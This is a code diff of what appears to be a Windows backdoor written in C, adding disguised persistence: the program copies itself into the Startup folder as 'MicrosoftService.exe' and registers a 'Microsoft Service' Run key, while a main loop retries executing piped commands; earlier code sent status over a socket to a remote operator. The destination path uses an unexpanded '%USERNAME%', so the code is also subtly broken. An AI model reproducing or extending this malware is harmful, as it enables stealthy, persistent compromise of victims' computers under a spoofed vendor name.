@@ -1,5 +1,3 @@
-// By HaxL0p4 ;)
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -9,39 +7,38 @@
 #include <winuser.h>
 #include <wininet.h>
 
+void copyToStartup(char *sourcePath, char *destinationPath) {
+    CopyFile(sourcePath, destinationPath, FALSE);
+}
 
 int bootRun() {
-    char err[128] = "Failed\n";
-    char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
     TCHAR szPath[MAX_PATH];
     DWORD pathLen = 0;
 
     pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
     if (pathLen == 0) {
-        send(sock, err, sizeof(err), 0);
         return -1;
     }
+
+    // Percorso di destinazione per copiare l'eseguibile
+    char destination[MAX_PATH] = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MicrosoftService.exe";
+    copyToStartup(szPath, destination);
 
     HKEY NewVal;
-
     if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
-        send(sock, err, sizeof(err), 0);
         return -1;
     }
 
-    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
-    if (RegSetValueEx(NewVal, TEXT("Microsoft Service"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+    DWORD pathLenInBytes = strlen(destination) + 1;
+    if (RegSetValueEx(NewVal, TEXT("Microsoft Service"), 0, REG_SZ, (LPBYTE)destination, pathLenInBytes) != ERROR_SUCCESS) {
         RegCloseKey(NewVal);
-        send(sock, err, sizeof(err), 0);
         return -1;
     }
     RegCloseKey(NewVal);
-    send(sock, suc, sizeof(suc), 0);
     return 0;
 }
 
 int main() {
-    
     bootRun();
 
     start:
@@ -57,8 +54,7 @@ int main() {
     unsigned char code[460];
     int counter = 0;
 
-
-    while(0 == (fpipe = (FILE*)f1(command, r))) {
+    while(0 == (fpipe = (FILE*)f1(command, "r"))) {
         Sleep(10);
         goto start;
     }
